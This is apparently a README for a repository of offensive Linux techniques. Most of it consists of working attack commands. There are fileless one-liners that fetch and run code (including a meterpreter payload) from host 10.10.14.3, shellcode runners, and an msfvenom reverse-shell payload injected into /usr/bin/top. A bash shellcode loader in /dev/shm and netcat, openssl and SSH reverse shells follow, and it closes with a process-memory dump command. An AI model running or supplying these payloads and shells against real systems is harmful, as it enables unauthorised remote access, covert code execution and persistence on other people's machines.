# Linux hacks
A collection of mostly security-related hacks for Linux operating systems. It is supposed to show that, while everyone is locking down their PowerShell and .NET in the Windows world, Linux is pretty much an attackers playground and is _not at all a more secure operating system_ (at least not by default).

## (shell)code execution
### [fileless.py](fileless.py)
Uses python to fetch a binary via http(s), write it to an in-memory file and execute it. For example to run the latest version of linpeas with all checks enabled you can just enter the following in any bash-compatible terminal:
```bash
python <(curl -s https://raw.githubusercontent.com/tav-r/Linux-hacks/main/fileless.py) https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh -a
```
of course this is pointless since you could also just run
```bash
bash <(curl -s https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh) -a
```
but maybe something like this?
```bash
FORK=1 python <(curl -s http://10.10.14.3/fileless.py) http://10.10.14.3/meterpreter
```

### [shellcode.py](shellcode.py)
Run shellcode from command line. First you need some base64-encoded shellcode:
```bash
nasm -f elf64 -o /tmp/shellcode.o shellcode.asm; ld -o /tmp/shellcode /tmp/shellcode.o; rm /tmp/shellcode.o
printf $(objdump -d /tmp/PIC_binary | egrep '^ ' | cut -f2 | sed -r -e 's/([0-9,a-f]{2})/\\x\1/g' -e 's/ //g' | tr -d '\n') | base64 | tr -d '\n'; echo; rm /tmp/shellcode
```
now we can run it (this simply spawns `/bin/sh`):
```bash
python shellcode.py McBIu9GdlpHQjJf/SPfbU1RfmVJXVF6wOw8F
```
of course we could do some more interesting stuff with this, like for example:
```bash
FORK=1 python <(curl 10.10.14.3/shellcode.py) $(curl --output - 10.10.14.3/shellcode.bin | base64 | tr -d '\n')
```

### [hide_in_image.py](hide_in_image.py)
This script forks and lets the child call `ptrace` to let the parent process trace it. After the child loaded a given binary using `execv`, the parent replaces the code at the entry point with the given shellcode and detaches. This is essentially an alternative way to run shellcode.
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.3 LPORT=443 | base64 | tr -d '\n'  # ailYmWoCX2oBXg8FSJdIuQIAAbt/AAABUUiJ5moQWmoqWA8FagNeSP/OaiFYDwV19mo7WJlIuy9iaW4vc2gAU0iJ51JXSInmDwU=
python3 hide_in_image.py /usr/bin/top ailYmWoCX2oBXg8FSJdIuQIAAbt/AAABUUiJ5moQWmoqWA8FagNeSP/OaiFYDwV19mo7WJlIuy9iaW4vc2gAU0iJ51JXSInmDwU=
```

### executing schellcode from `bash`
Quasi-fileless (assuming writing to `/dev/shm` is considered fileless) execution of shellcode can also be achieved using `bash` scripting only.
```bash
# read first function argument
shellcode=$(base64 -d <<<$1)

# create temoporary in-memory copy of a binary
binpath="/dev/shm/$(cat /dev/urandom | tr -cd [:alpha:] | head -c 10).tmp"
cp $(which ls) $binpath

# read entry point (check `man proc`)
offset=$(printf "%d" "0x$(dd if=$binpath skip=24 count=8 bs=1 2>/dev/null | xxd -e -g 8 | cut -d' ' -f2)")

# write shellcode to temporary file
echo $shellcode | dd conv=notrunc of=$binpath seek=$offset count=$(wc -c <<<$shellcode) bs=1 2>/dev/null

# execute and remove the file
rm $binpath & exec $binpath
```

## fancy reverse shells and backdoors
```bash
# classic
mkfifo /tmp/p;nc 10.10.14.3 8888 </tmp/p | /bin/bash > /tmp/p;rm /tmp/p
# encrypted using openssl cli, handy if netcat not installed. Server has to use something like ncat --ssl -lvp ...
mkfifo /tmp/p;openssl s_client -quiet 10.10.14.3:8443 2>/dev/null < /tmp/p|bash>/tmp/p;rm /tmp/p
# tunneling over SSH (server listening on localhost:8080)
ssh -fN -L48924:127.0.0.1:8080 10.10.14.3;/bin/bash -l > /dev/tcp/localhost/48924 0<&1 2>&1
```

## forensics and reverse engineering
```bash
# dump all process memory including shared libraries etc., copy mapping info and archive everything.
# must be run as root (other users don't seem to be allowed to read memory)
 export PID=107136;export OUTDIR=$(mktemp -d);cat /proc/$PID/maps | cut -d" " -f1 | awk -F'-' '{print "dd if=/proc/$PID/mem of=${OUTDIR}/${PID}_"$1".dump bs=1 skip=$(printf %u 0x"$1") count=$((0x"$2"-0x"$1"))"}' | xargs -I DIFF bash -c "DIFF";cp /proc/$PID/maps $OUTDIR/maps;cd $OUTDIR;ls -1|tar cvzf dump_$PID.tar.gz --files-from=/dev/stdin;rm *.dump maps
```
